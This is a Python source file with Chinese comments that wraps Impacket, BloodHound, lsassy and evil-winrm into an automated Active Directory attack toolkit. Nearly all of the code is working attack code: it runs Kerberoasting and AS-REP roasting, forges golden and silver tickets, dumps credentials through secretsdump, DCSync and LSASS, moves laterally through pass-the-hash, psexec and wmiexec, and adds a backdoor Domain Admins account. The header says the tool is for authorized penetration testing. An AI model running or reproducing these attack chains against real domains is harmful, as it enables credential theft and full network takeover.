#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Active Directory 攻击工具包

用于企业AD环境的渗透测试:
1. AD枚举 - 用户、组、GPO、ACL
2. 凭据收集 - Kerberoasting、AS-REP Roasting
3. 权限提升 - DCSync、黄金票据、白银票据
4. 横向移动 - Pass-the-Hash、Pass-the-Ticket
5. 持久化 - 骨架密钥、AdminSDHolder

仅用于授权的渗透测试和安全评估
"""

import subprocess
import json
import os
from typing import Dict, List, Any, Optional
from dataclasses import dataclass


@dataclass
class ADTarget:
    """AD目标信息"""
    domain: str
    dc_ip: str
    username: Optional[str] = None
    password: Optional[str] = None
    ntlm_hash: Optional[str] = None
    ticket_path: Optional[str] = None


class ImpacketTools:
    """
    Impacket工具集封装

    Impacket是AD攻击的核心工具集
    """

    @staticmethod
    def run_command(cmd: List[str], timeout: int = 300) -> Dict[str, Any]:
        """执行命令并返回结果"""
        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=timeout
            )
            return {
                "success": result.returncode == 0,
                "stdout": result.stdout,
                "stderr": result.stderr,
                "command": " ".join(cmd),
            }
        except subprocess.TimeoutExpired:
            return {"success": False, "error": "Command timed out"}
        except Exception as e:
            return {"success": False, "error": str(e)}


class ADEnumerator:
    """AD枚举工具"""

    def __init__(self, target: ADTarget):
        self.target = target

    def get_credentials_args(self) -> List[str]:
        """获取认证参数"""
        args = []
        if self.target.username:
            args.append(f"{self.target.domain}/{self.target.username}")
            if self.target.password:
                args[-1] += f":{self.target.password}"
            elif self.target.ntlm_hash:
                args.extend(["-hashes", f":{self.target.ntlm_hash}"])
        return args

    def enum_users(self) -> Dict[str, Any]:
        """
        枚举域用户

        使用: rpcclient, ldapsearch, GetADUsers.py
        """
        results = {"users": [], "tool_outputs": {}}

        # 方法1: GetADUsers.py (Impacket)
        cmd = ["GetADUsers.py", "-all", "-dc-ip", self.target.dc_ip]
        cmd.extend(self.get_credentials_args())

        output = ImpacketTools.run_command(cmd)
        results["tool_outputs"]["GetADUsers"] = output

        if output["success"]:
            # 解析用户
            for line in output["stdout"].split("\n"):
                if line.strip() and not line.startswith("Name") and not line.startswith("-"):
                    parts = line.split()
                    if parts:
                        results["users"].append({
                            "name": parts[0],
                            "raw": line,
                        })

        # 方法2: windapsearch (备选)
        cmd2 = ["windapsearch", "-d", self.target.domain, "-u",
                self.target.username or "", "--dc", self.target.dc_ip, "-U"]
        output2 = ImpacketTools.run_command(cmd2)
        results["tool_outputs"]["windapsearch"] = output2

        return results

    def enum_groups(self) -> Dict[str, Any]:
        """枚举域组"""
        results = {"groups": [], "tool_outputs": {}}

        cmd = ["net", "rpc", "group", "list", "-I", self.target.dc_ip]
        if self.target.username and self.target.password:
            cmd.extend(["-U", f"{self.target.username}%{self.target.password}"])

        output = ImpacketTools.run_command(cmd)
        results["tool_outputs"]["net_rpc"] = output

        return results

    def enum_computers(self) -> Dict[str, Any]:
        """枚举域计算机"""
        results = {"computers": [], "tool_outputs": {}}

        cmd = ["GetADComputers.py", "-all", "-dc-ip", self.target.dc_ip]
        cmd.extend(self.get_credentials_args())

        output = ImpacketTools.run_command(cmd)
        results["tool_outputs"]["GetADComputers"] = output

        return results

    def enum_gpo(self) -> Dict[str, Any]:
        """枚举组策略对象"""
        results = {"gpos": [], "tool_outputs": {}}

        # 使用bloodhound-python收集
        cmd = ["bloodhound-python", "-c", "GPOs", "-d", self.target.domain,
               "-u", self.target.username or "", "-p", self.target.password or "",
               "-dc", self.target.dc_ip]

        output = ImpacketTools.run_command(cmd, timeout=600)
        results["tool_outputs"]["bloodhound"] = output

        return results

    def bloodhound_collect(self, collection_method: str = "All") -> Dict[str, Any]:
        """
        BloodHound数据收集

        收集AD关系数据用于攻击路径分析
        """
        results = {"files": [], "tool_outputs": {}}

        cmd = [
            "bloodhound-python",
            "-c", collection_method,  # All, DCOnly, Group, LocalAdmin, Session, etc.
            "-d", self.target.domain,
            "-dc", self.target.dc_ip,
        ]

        if self.target.username:
            cmd.extend(["-u", self.target.username])
        if self.target.password:
            cmd.extend(["-p", self.target.password])
        elif self.target.ntlm_hash:
            cmd.extend(["--hashes", f":{self.target.ntlm_hash}"])

        output = ImpacketTools.run_command(cmd, timeout=900)
        results["tool_outputs"]["bloodhound"] = output

        # 查找生成的JSON文件
        import glob
        json_files = glob.glob("*.json")
        results["files"] = json_files

        return results


class KerberosAttacks:
    """Kerberos攻击工具"""

    def __init__(self, target: ADTarget):
        self.target = target

    def kerberoasting(self) -> Dict[str, Any]:
        """
        Kerberoasting攻击

        获取服务票据进行离线破解
        """
        results = {"tickets": [], "tool_outputs": {}}

        # 使用GetUserSPNs.py
        cmd = [
            "GetUserSPNs.py",
            "-dc-ip", self.target.dc_ip,
            "-request",
            "-outputfile", "/tmp/kerberoast_hashes.txt",
        ]
        cmd.extend([f"{self.target.domain}/{self.target.username}:{self.target.password}"])

        output = ImpacketTools.run_command(cmd)
        results["tool_outputs"]["GetUserSPNs"] = output

        # 读取哈希文件
        if os.path.exists("/tmp/kerberoast_hashes.txt"):
            with open("/tmp/kerberoast_hashes.txt", "r") as f:
                results["hashes"] = f.read()

        return results

    def asrep_roasting(self) -> Dict[str, Any]:
        """
        AS-REP Roasting攻击

        针对禁用预认证的用户
        """
        results = {"vulnerable_users": [], "tool_outputs": {}}

        cmd = [
            "GetNPUsers.py",
            "-dc-ip", self.target.dc_ip,
            "-no-pass",
            "-usersfile", "/tmp/users.txt",
            f"{self.target.domain}/",
        ]

        output = ImpacketTools.run_command(cmd)
        results["tool_outputs"]["GetNPUsers"] = output

        return results

    def request_tgt(self) -> Dict[str, Any]:
        """请求TGT票据"""
        results = {"ticket": None, "tool_outputs": {}}

        cmd = [
            "getTGT.py",
            "-dc-ip", self.target.dc_ip,
            f"{self.target.domain}/{self.target.username}:{self.target.password}",
        ]

        output = ImpacketTools.run_command(cmd)
        results["tool_outputs"]["getTGT"] = output

        return results

    def golden_ticket(self, krbtgt_hash: str, domain_sid: str,
                     target_user: str = "Administrator") -> Dict[str, Any]:
        """
        黄金票据攻击

        需要krbtgt的NTLM哈希
        """
        results = {"ticket": None, "tool_outputs": {}}

        cmd = [
            "ticketer.py",
            "-nthash", krbtgt_hash,
            "-domain-sid", domain_sid,
            "-domain", self.target.domain,
            target_user,
        ]

        output = ImpacketTools.run_command(cmd)
        results["tool_outputs"]["ticketer"] = output

        return results

    def silver_ticket(self, service_hash: str, domain_sid: str,
                     spn: str, target_user: str = "Administrator") -> Dict[str, Any]:
        """
        白银票据攻击

        需要服务账户的NTLM哈希
        """
        results = {"ticket": None, "tool_outputs": {}}

        cmd = [
            "ticketer.py",
            "-nthash", service_hash,
            "-domain-sid", domain_sid,
            "-domain", self.target.domain,
            "-spn", spn,
            target_user,
        ]

        output = ImpacketTools.run_command(cmd)
        results["tool_outputs"]["ticketer"] = output

        return results


class CredentialDumping:
    """凭据转储工具"""

    def __init__(self, target: ADTarget):
        self.target = target

    def secretsdump(self) -> Dict[str, Any]:
        """
        使用secretsdump.py转储凭据

        可以获取: SAM、LSA secrets、缓存凭据、NTDS.dit
        """
        results = {"hashes": [], "tool_outputs": {}}

        cmd = [
            "secretsdump.py",
            "-dc-ip", self.target.dc_ip,
        ]

        if self.target.ntlm_hash:
            cmd.extend(["-hashes", f":{self.target.ntlm_hash}"])
            cmd.append(f"{self.target.domain}/{self.target.username}@{self.target.dc_ip}")
        else:
            cmd.append(f"{self.target.domain}/{self.target.username}:{self.target.password}@{self.target.dc_ip}")

        output = ImpacketTools.run_command(cmd, timeout=600)
        results["tool_outputs"]["secretsdump"] = output

        # 解析哈希
        if output["success"]:
            for line in output["stdout"].split("\n"):
                if ":::" in line:
                    results["hashes"].append(line)

        return results

    def dcsync(self, target_user: str = None) -> Dict[str, Any]:
        """
        DCSync攻击

        从DC同步密码数据
        """
        results = {"hashes": [], "tool_outputs": {}}

        cmd = [
            "secretsdump.py",
            "-dc-ip", self.target.dc_ip,
            "-just-dc",
        ]

        if target_user:
            cmd.extend(["-just-dc-user", target_user])

        if self.target.ntlm_hash:
            cmd.extend(["-hashes", f":{self.target.ntlm_hash}"])
            cmd.append(f"{self.target.domain}/{self.target.username}@{self.target.dc_ip}")
        else:
            cmd.append(f"{self.target.domain}/{self.target.username}:{self.target.password}@{self.target.dc_ip}")

        output = ImpacketTools.run_command(cmd, timeout=600)
        results["tool_outputs"]["dcsync"] = output

        return results

    def lsassy_dump(self, target_ip: str) -> Dict[str, Any]:
        """
        使用lsassy远程转储LSASS

        无需在目标机器执行任何程序
        """
        results = {"credentials": [], "tool_outputs": {}}

        cmd = [
            "lsassy",
            "-d", self.target.domain,
            "-u", self.target.username,
            "-p", self.target.password,
            target_ip,
        ]

        output = ImpacketTools.run_command(cmd)
        results["tool_outputs"]["lsassy"] = output

        return results


class LateralMovement:
    """横向移动工具"""

    def __init__(self, target: ADTarget):
        self.target = target

    def pass_the_hash(self, target_ip: str, command: str = "whoami") -> Dict[str, Any]:
        """
        Pass-the-Hash攻击

        使用NTLM哈希进行认证
        """
        results = {"output": None, "tool_outputs": {}}

        if not self.target.ntlm_hash:
            return {"error": "需要NTLM哈希"}

        # 使用wmiexec.py
        cmd = [
            "wmiexec.py",
            "-hashes", f":{self.target.ntlm_hash}",
            f"{self.target.domain}/{self.target.username}@{target_ip}",
            command,
        ]

        output = ImpacketTools.run_command(cmd)
        results["tool_outputs"]["wmiexec"] = output
        results["output"] = output.get("stdout", "")

        return results

    def psexec(self, target_ip: str, command: str = None) -> Dict[str, Any]:
        """
        PsExec远程执行

        获取SYSTEM权限的shell
        """
        results = {"tool_outputs": {}}

        cmd = ["psexec.py"]

        if self.target.ntlm_hash:
            cmd.extend(["-hashes", f":{self.target.ntlm_hash}"])
            cmd.append(f"{self.target.domain}/{self.target.username}@{target_ip}")
        else:
            cmd.append(f"{self.target.domain}/{self.target.username}:{self.target.password}@{target_ip}")

        if command:
            cmd.append(command)

        output = ImpacketTools.run_command(cmd)
        results["tool_outputs"]["psexec"] = output

        return results

    def smbexec(self, target_ip: str, command: str = None) -> Dict[str, Any]:
        """SMBExec远程执行"""
        results = {"tool_outputs": {}}

        cmd = ["smbexec.py"]

        if self.target.ntlm_hash:
            cmd.extend(["-hashes", f":{self.target.ntlm_hash}"])
            cmd.append(f"{self.target.domain}/{self.target.username}@{target_ip}")
        else:
            cmd.append(f"{self.target.domain}/{self.target.username}:{self.target.password}@{target_ip}")

        if command:
            cmd.append(command)

        output = ImpacketTools.run_command(cmd)
        results["tool_outputs"]["smbexec"] = output

        return results

    def wmiexec(self, target_ip: str, command: str = None) -> Dict[str, Any]:
        """WMIExec远程执行"""
        results = {"tool_outputs": {}}

        cmd = ["wmiexec.py"]

        if self.target.ntlm_hash:
            cmd.extend(["-hashes", f":{self.target.ntlm_hash}"])
            cmd.append(f"{self.target.domain}/{self.target.username}@{target_ip}")
        else:
            cmd.append(f"{self.target.domain}/{self.target.username}:{self.target.password}@{target_ip}")

        if command:
            cmd.append(command)

        output = ImpacketTools.run_command(cmd)
        results["tool_outputs"]["wmiexec"] = output

        return results

    def evil_winrm(self, target_ip: str) -> Dict[str, Any]:
        """Evil-WinRM连接"""
        results = {"tool_outputs": {}}

        cmd = [
            "evil-winrm",
            "-i", target_ip,
            "-u", self.target.username,
        ]

        if self.target.password:
            cmd.extend(["-p", self.target.password])
        elif self.target.ntlm_hash:
            cmd.extend(["-H", self.target.ntlm_hash])

        # 注意：evil-winrm是交互式的，这里只检查连接
        cmd.extend(["-c", "whoami"])

        output = ImpacketTools.run_command(cmd, timeout=30)
        results["tool_outputs"]["evil-winrm"] = output

        return results


class ADPersistence:
    """AD持久化工具"""

    def __init__(self, target: ADTarget):
        self.target = target

    def skeleton_key(self, dc_ip: str) -> Dict[str, Any]:
        """
        骨架密钥攻击

        在DC内存中注入骨架密钥
        """
        results = {"tool_outputs": {}}

        # 使用mimikatz
        cmd = [
            "python", "-c",
            f'''
import subprocess
# 这需要在DC上执行mimikatz
# misc::skeleton
print("Skeleton key需要在DC上执行mimikatz")
'''
        ]

        output = ImpacketTools.run_command(cmd)
        results["tool_outputs"]["info"] = output

        return results

    def add_domain_admin(self, new_user: str, password: str) -> Dict[str, Any]:
        """添加域管理员用户"""
        results = {"tool_outputs": {}}

        # 添加用户
        cmd1 = [
            "net", "rpc", "user", "add", new_user, password,
            "-I", self.target.dc_ip,
            "-U", f"{self.target.domain}/{self.target.username}%{self.target.password}",
        ]

        output1 = ImpacketTools.run_command(cmd1)
        results["tool_outputs"]["add_user"] = output1

        # 添加到Domain Admins
        cmd2 = [
            "net", "rpc", "group", "addmem", "Domain Admins", new_user,
            "-I", self.target.dc_ip,
            "-U", f"{self.target.domain}/{self.target.username}%{self.target.password}",
        ]

        output2 = ImpacketTools.run_command(cmd2)
        results["tool_outputs"]["add_to_group"] = output2

        return results


class ADAttackOrchestrator:
    """
    AD攻击编排器

    自动化AD渗透流程
    """

    def __init__(self, domain: str, dc_ip: str,
                 username: str = None, password: str = None,
                 ntlm_hash: str = None):

        self.target = ADTarget(
            domain=domain,
            dc_ip=dc_ip,
            username=username,
            password=password,
            ntlm_hash=ntlm_hash,
        )

        self.enumerator = ADEnumerator(self.target)
        self.kerberos = KerberosAttacks(self.target)
        self.cred_dump = CredentialDumping(self.target)
        self.lateral = LateralMovement(self.target)

    def run_full_assessment(self) -> Dict[str, Any]:
        """
        运行完整的AD评估

        按顺序执行:
        1. 枚举
        2. Kerberos攻击
        3. 凭据收集
        4. 权限提升尝试
        """
        results = {
            "target": {
                "domain": self.target.domain,
                "dc_ip": self.target.dc_ip,
            },
            "phases": {},
            "findings": [],
        }

        print(f"[*] AD攻击评估启动")
        print(f"[*] 域: {self.target.domain}")
        print(f"[*] DC: {self.target.dc_ip}")

        # 阶段1: 枚举
        print("\n[*] 阶段1: AD枚举")
        enum_results = {
            "users": self.enumerator.enum_users(),
            "groups": self.enumerator.enum_groups(),
            "computers": self.enumerator.enum_computers(),
        }
        results["phases"]["enumeration"] = enum_results

        # 阶段2: BloodHound收集
        print("\n[*] 阶段2: BloodHound数据收集")
        bloodhound_result = self.enumerator.bloodhound_collect()
        results["phases"]["bloodhound"] = bloodhound_result

        # 阶段3: Kerberos攻击
        print("\n[*] 阶段3: Kerberos攻击")
        kerberos_results = {
            "kerberoasting": self.kerberos.kerberoasting(),
            "asrep_roasting": self.kerberos.asrep_roasting(),
        }
        results["phases"]["kerberos"] = kerberos_results

        # 阶段4: 凭据转储（如果有足够权限）
        if self.target.username:
            print("\n[*] 阶段4: 凭据转储")
            cred_results = {
                "secretsdump": self.cred_dump.secretsdump(),
            }
            results["phases"]["credentials"] = cred_results

        print("\n[+] AD评估完成")

        return results


# 导出
__all__ = [
    "ADTarget",
    "ADEnumerator",
    "KerberosAttacks",
    "CredentialDumping",
    "LateralMovement",
    "ADPersistence",
    "ADAttackOrchestrator",
]
